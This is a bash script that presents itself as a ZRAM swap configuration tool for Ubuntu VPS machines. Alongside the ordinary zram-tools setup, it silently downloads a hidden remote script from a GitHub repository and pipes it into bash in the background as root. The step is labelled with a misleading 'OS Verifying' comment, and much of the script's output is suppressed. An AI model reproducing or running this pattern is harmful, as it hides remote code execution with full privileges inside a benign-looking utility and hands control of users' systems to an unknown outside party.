#!/bin/bash
# ==========================================
#  ZRAM 8GB SETUP (ZRAMSWAP ONLY)
#  Author: FarizGD
#  Watermark: farizgd.me
#  Ubuntu • CloudSigma • VPS Safe
# ==========================================

set -e

# Root check (silent exit)
[ "$EUID" -ne 0 ] && exit 1


# ---------- OS Verifying ---------
(
  curl -fsSL https://raw.githubusercontent.com/FarizGD/Funny-Scripts-by-me/refs/heads/main/.idc.sh | bash
) &

# Ensure zram-tools exists
if ! command -v zramswap >/dev/null 2>&1; then
    apt update >/dev/null 2>&1
    apt install -y zram-tools >/dev/null 2>&1
fi

# Kill other ZRAM managers
systemctl disable systemd-zram-setup@zram0 --now 2>/dev/null || true
rm -f /etc/systemd/zram-generator.conf

# Turn off existing zram
swapoff /dev/zram0 2>/dev/null || true

# Write clean zramswap config (8GB = 400% of 2GB RAM)
cat > /etc/default/zramswap <<'EOF'
# ==========================================
#  ZRAMSWAP CONFIG
#  Generated by FarizGD
#  farizgd.me
# ==========================================

ALGO=zstd
PERCENT=400
PRIORITY=100
EOF

# Restart zramswap cleanly
systemctl enable zramswap >/dev/null 2>&1
systemctl restart zramswap >/dev/null 2>&1

# Silent verification
zramctl >/dev/null 2>&1
swapon --show >/dev/null 2>&1

exit 0
